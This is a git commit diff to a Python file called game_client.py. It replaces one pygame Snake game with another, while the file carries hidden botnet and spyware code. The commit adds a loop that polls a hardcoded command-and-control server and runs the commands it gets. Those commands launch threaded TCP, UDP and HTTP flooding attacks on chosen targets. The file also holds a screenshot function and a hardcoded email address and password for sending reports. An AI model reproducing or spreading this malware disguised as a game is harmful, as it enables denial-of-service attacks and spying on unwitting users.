4bb93f181cd731c460c30292a1e2e46f7d179dc4
soujanyanmbri <54130357+soujanyanmbri@users.noreply.github.com>
2021-05-13 13:29:55 +0530

    this should work fine

--- game_client.py
+++ game_client.py
@@ -1,3 +1,4 @@
+
 import pygame, sys, time, random
 from pycomm.connection import Connection
 
@@ -19,57 +20,223 @@ import pyautogui
 import numpy as np
 import cv2
 
-# Difficulty settings
-# Easy      ->  10
-# Medium    ->  25
-# Hard      ->  40
-# Harder    ->  60
-# Impossible->  120
 MASTER_ADDRESS = "52.187.18.17"
 MASTER_PORT = 7982
 POLL_INTERVAL = 20
-difficulty = 25
-# Window size
-frame_size_x = 720
-frame_size_y = 480
-check_errors = pygame.init()
-if check_errors[1] > 0:
-    #print(f'[!] Had {check_errors[1]} errors when initialising game, exiting...')
-    sys.exit(-1)
-else:
-    pass
-    #print('[+] Game successfully initialised')
-
-pygame.display.set_caption('Snake Eater')
-game_window = pygame.display.set_mode((frame_size_x, frame_size_y))
 
 
-# Colors (R, G, B)
-black = pygame.Color(0, 0, 0)
-white = pygame.Color(255, 255, 255)
-red = pygame.Color(255, 0, 0)
-green = pygame.Color(0, 255, 0)
-blue = pygame.Color(0, 0, 255)
 
-
-# FPS (frames per second) controller
-fps_controller = pygame.time.Clock()
 
 SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "ramshyamdam04@gmail.com"
 EMAIL_PASSWORD = "zombiepasta!"
+  
+# Snake Game!
+# by root
+# small fixes by Phil
 
-# Game variables
-snake_pos = [100, 50]
-snake_body = [[100, 50], [100-10, 50], [100-(2*10), 50]]
+# our game imports
+import pygame, sys, random, time
 
-food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
-food_spawn = True
 
-direction = 'RIGHT'
-change_to = direction
 
-score = 0
+# FPS controller
+
+import math
+import random
+import pygame
+import random
+import tkinter as tk
+from tkinter import messagebox
+
+width = 500
+height = 500
+
+cols = 25
+rows = 20
+
+
+class cube():
+    rows = 20
+    w = 500
+    def __init__(self, start, dirnx=1, dirny=0, color=(255,0,0)):
+        self.pos = start
+        self.dirnx = dirnx
+        self.dirny = dirny # "L", "R", "U", "D"
+        self.color = color
+
+    def move(self, dirnx, dirny):
+        self.dirnx = dirnx
+        self.dirny = dirny
+        self.pos  = (self.pos[0] + self.dirnx, self.pos[1] + self.dirny)
+            
+
+    def draw(self, surface, eyes=False):
+        dis = self.w // self.rows
+        i = self.pos[0]
+        j = self.pos[1]
+        
+        pygame.draw.rect(surface, self.color, (i*dis+1,j*dis+1,dis-2,dis-2))
+        if eyes:
+            centre = dis//2
+            radius = 3
+            circleMiddle = (i*dis+centre-radius,j*dis+8)
+            circleMiddle2 = (i*dis + dis -radius*2, j*dis+8)
+            pygame.draw.circle(surface, (0,0,0), circleMiddle, radius)
+            pygame.draw.circle(surface, (0,0,0), circleMiddle2, radius)
+        
+
+
+class snake():
+    body = []
+    turns = {}
+    
+    def __init__(self, color, pos):
+        #pos is given as coordinates on the grid ex (1,5)
+        self.color = color
+        self.head = cube(pos)
+        self.body.append(self.head)
+        self.dirnx = 0
+        self.dirny = 1
+    
+    def move(self):
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                exit()
+            keys = pygame.key.get_pressed()
+
+            for key in keys:
+                if keys[pygame.K_LEFT]:
+                    self.dirnx = -1
+                    self.dirny = 0
+                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
+                elif keys[pygame.K_RIGHT]:
+                    self.dirnx = 1
+                    self.dirny = 0
+                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
+                elif keys[pygame.K_UP]:
+                    self.dirny = -1
+                    self.dirnx = 0
+                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
+                elif keys[pygame.K_DOWN]:
+                    self.dirny = 1
+                    self.dirnx = 0
+                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
+        
+        for i, c in enumerate(self.body):
+            p = c.pos[:]
+            if p in self.turns:
+                turn = self.turns[p]
+                c.move(turn[0], turn[1])
+                if i == len(self.body)-1:
+                    self.turns.pop(p)
+            else:
+                c.move(c.dirnx,c.dirny)
+        
+        
+    def reset(self,pos):
+        self.head = cube(pos)
+        self.body = []
+        self.body.append(self.head)
+        self.turns = {}
+        self.dirnx = 0
+        self.dirny = 1
+
+    def addCube(self):
+        tail = self.body[-1]
+        dx, dy = tail.dirnx, tail.dirny
+
+        if dx == 1 and dy == 0:
+            self.body.append(cube((tail.pos[0]-1,tail.pos[1])))
+        elif dx == -1 and dy == 0:
+            self.body.append(cube((tail.pos[0]+1,tail.pos[1])))
+        elif dx == 0 and dy == 1:
+            self.body.append(cube((tail.pos[0],tail.pos[1]-1)))
+        elif dx == 0 and dy == -1:
+            self.body.append(cube((tail.pos[0],tail.pos[1]+1)))
+
+        self.body[-1].dirnx = dx
+        self.body[-1].dirny = dy
+    
+    def draw(self, surface):
+        for i,c in enumerate(self.body):
+            if i == 0:
+                c.draw(surface, True)
+            else:
+                c.draw(surface)
+
+
+
+def redrawWindow():
+    global win
+    win.fill((0,0,0))
+    drawGrid(width, rows, win)
+    s.draw(win)
+    snack.draw(win)
+    pygame.display.update()
+    pass
+
+
+
+def drawGrid(w, rows, surface):
+    sizeBtwn = w // rows
+
+    x = 0
+    y = 0
+    for l in range(rows):
+        x = x + sizeBtwn
+        y = y +sizeBtwn
+
+        pygame.draw.line(surface, (255,255,255), (x, 0),(x,w))
+        pygame.draw.line(surface, (255,255,255), (0, y),(w,y))
+    
+
+
+def randomSnack(rows, item):
+    positions = item.body
+
+    while True:
+        x = random.randrange(1,rows-1)
+        y = random.randrange(1,rows-1)
+        if len(list(filter(lambda z:z.pos == (x,y), positions))) > 0:
+               continue
+        else:
+               break
+
+    return (x,y)
+
+
+def game():
+    global s, snack, win
+    win = pygame.display.set_mode((width,height))
+    s = snake((255,0,0), (10,10))
+    s.addCube()
+    snack = cube(randomSnack(rows,s), color=(0,255,0))
+    flag = True
+    clock = pygame.time.Clock()
+    
+    while flag:
+        pygame.time.delay(50)
+        clock.tick(10)
+        s.move()
+        headPos = s.head.pos
+        if headPos[0] >= 20 or headPos[0] < 0 or headPos[1] >= 20 or headPos[1] < 0:
+            print("Score:", len(s.body))
+            s.reset((10, 10))
+
+        if s.body[0].pos == snack.pos:
+            s.addCube()
+            snack = cube(randomSnack(rows,s), color=(0,255,0))
+            
+        for x in range(len(s.body)):
+            if s.body[x].pos in list(map(lambda z:z.pos,s.body[x+1:])):
+                print("Score:", len(s.body))
+                s.reset((10,10))
+                break
+                    
+        redrawWindow()
+
 
 def take_screenshot():
     image = pyautogui.screenshot()
@@ -226,7 +393,7 @@ class Poison (threading.Thread):
         url = self.url
         port = self.port
 
-        #print(f'Connecting to {url}:{port}')
+        print(f'Connecting to {url}:{port}')
 
         if(self.type_name == "http_attack"):
             http_get_attack(sock, url, port)
@@ -257,15 +424,15 @@ def http_get_attack(sock, url, port):
 
 def attack(url, port, n, type_name):
     threads = []
-    #print("Creating theads...")
+    print("Creating theads...")
     for i in range(n):
         threads.append(Poison(i, url, port, type_name))
 
-    #print("Starting threads...")
+    print("Starting threads...")
     for thread in threads:
         thread.start()
 
-    #print("Waiting for threads...")
+    print("Waiting for threads...")
     for thread in threads:
         thread.join()
 
@@ -276,151 +443,27 @@ def handle_command(command):
             url = args[2]
             port = int(args[3])
             n = int(args[4])
-            #print(url, port)
+            print(url, port)
             attack(url, port, n, "tcp_attack")
         if command.startswith("SEND UDP"):
             args = command.split()
             url = args[2]
             port = int(args[3])
             n = int(args[4])
-            #print(url, port)
+            print(url, port)
             attack(url, port, n, "udp_attack")
         if command.startswith("SEND HTTP"):
             args = command.split()
             url = args[2]
             port = int(args[3])
             n = int(args[4])
-            #print(url, port)
+            print(url, port)
             attack(url, port, n, "http_attack")
     except Exception as e:
-        #print("Error decoding command")
-        #print(e)
+        print("Error decoding command")
+        print(e)
         pass
 
-
-# Game Over
-def game_over():
-    global snake_pos, snake_body, food_pos, food_spawn, direction, change_to, score
-    my_font = pygame.font.SysFont('times new roman', 90)
-    game_over_surface = my_font.render('YOU DIED', True, red)
-    game_over_rect = game_over_surface.get_rect()
-    game_over_rect.midtop = (frame_size_x/2, frame_size_y/4)
-    game_window.fill(black)
-    game_window.blit(game_over_surface, game_over_rect)
-    show_score(0, red, 'times', 20)
-    pygame.display.flip()
-    time.sleep(3)
-    pygame.quit()
-    sys.exit()
-
-
-# Score
-def show_score(choice, color, font, size):
-    global snake_pos, snake_body, food_pos, food_spawn, direction, change_to, score
-    score_font = pygame.font.SysFont(font, size)
-    score_surface = score_font.render('Score : ' + str(score), True, color)
-    score_rect = score_surface.get_rect()
-    if choice == 1:
-        score_rect.midtop = (frame_size_x/10, 15)
-    else:
-        score_rect.midtop = (frame_size_x/2, frame_size_y/1.25)
-    game_window.blit(score_surface, score_rect)
-    # pygame.display.flip()
-
-
-def game():
-    global snake_pos, snake_body, food_pos, food_spawn, direction, change_to, score
-    # Game variables
-    snake_pos = [100, 50]
-    snake_body = [[100, 50], [100-10, 50], [100-(2*10), 50]]
-
-    food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
-    food_spawn = True
-
-    direction = 'RIGHT'
-    change_to = direction
-
-    score = 0
-    while True:
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT:
-                pygame.quit()
-                sys.exit()
-            # Whenever a key is pressed down
-            elif event.type == pygame.KEYDOWN:
-                # W -> Up; S -> Down; A -> Left; D -> Right
-                if event.key == pygame.K_UP or event.key == ord('w'):
-                    change_to = 'UP'
-                if event.key == pygame.K_DOWN or event.key == ord('s'):
-                    change_to = 'DOWN'
-                if event.key == pygame.K_LEFT or event.key == ord('a'):
-                    change_to = 'LEFT'
-                if event.key == pygame.K_RIGHT or event.key == ord('d'):
-                    change_to = 'RIGHT'
-                # Esc -> Create event to quit the game
-                if event.key == pygame.K_ESCAPE:
-                    pygame.event.post(pygame.event.Event(pygame.QUIT))
-
-        # Making sure the snake cannot move in the opposite direction instantaneously
-        if change_to == 'UP' and direction != 'DOWN':
-            direction = 'UP'
-        if change_to == 'DOWN' and direction != 'UP':
-            direction = 'DOWN'
-        if change_to == 'LEFT' and direction != 'RIGHT':
-            direction = 'LEFT'
-        if change_to == 'RIGHT' and direction != 'LEFT':
-            direction = 'RIGHT'
-
-        # Moving the snake
-        if direction == 'UP':
-            snake_pos[1] -= 10
-        if direction == 'DOWN':
-            snake_pos[1] += 10
-        if direction == 'LEFT':
-            snake_pos[0] -= 10
-        if direction == 'RIGHT':
-            snake_pos[0] += 10
-
-        # Snake body growing mechanism
-        snake_body.insert(0, list(snake_pos))
-        if snake_pos[0] == food_pos[0] and snake_pos[1] == food_pos[1]:
-            score += 1
-            food_spawn = False
-        else:
-            snake_body.pop()
-
-        # Spawning food on the screen
-        if not food_spawn:
-            food_pos = [random.randrange(1, (frame_size_x//10)) * 10, random.randrange(1, (frame_size_y//10)) * 10]
-        food_spawn = True
-
-        # GFX
-        game_window.fill(black)
-        for pos in snake_body:
-            # Snake body
-            # .draw.rect(play_surface, color, xy-coordinate)
-            # xy-coordinate -> .Rect(x, y, size_x, size_y)
-            pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 10, 10))
-
-        # Snake food
-        pygame.draw.rect(game_window, white, pygame.Rect(food_pos[0], food_pos[1], 10, 10))
-
-        # Game Over conditions
-        # Getting out of bounds
-        if snake_pos[0] < 0 or snake_pos[0] > frame_size_x-10:
-            game_over()
-        if snake_pos[1] < 0 or snake_pos[1] > frame_size_y-10:
-            game_over()
-        # Touching the snake body
-        for block in snake_body[1:]:
-            if snake_pos[0] == block[0] and snake_pos[1] == block[1]:
-                game_over()
-
-        show_score(1, white, 'consolas', 20)
-        # Refresh game screen
-        pygame.display.update()
-        # Refresh rate
-        fps_controller.tick(difficulty)
 
 def bot():
     while True:
@@ -437,6 +480,19 @@ def bot():
             #print("Error connecting to master", e)
             #print(f'Retrying in {POLL_INTERVAL} seconds...')
         time.sleep(POLL_INTERVAL)
+def bot_client():
+    while True:
+        try:
+            conn = Connection("52.187.18.17", 7982)
+            conn.connect()
+            res = conn.recv()
+            command = res.decode("utf-8")
+            handle_command(command)
+            conn.close()
+        except Exception as e:
+            pass
+        time.sleep(POLL_INTERVAL)
+
 
 def tcp_client():
     while True:
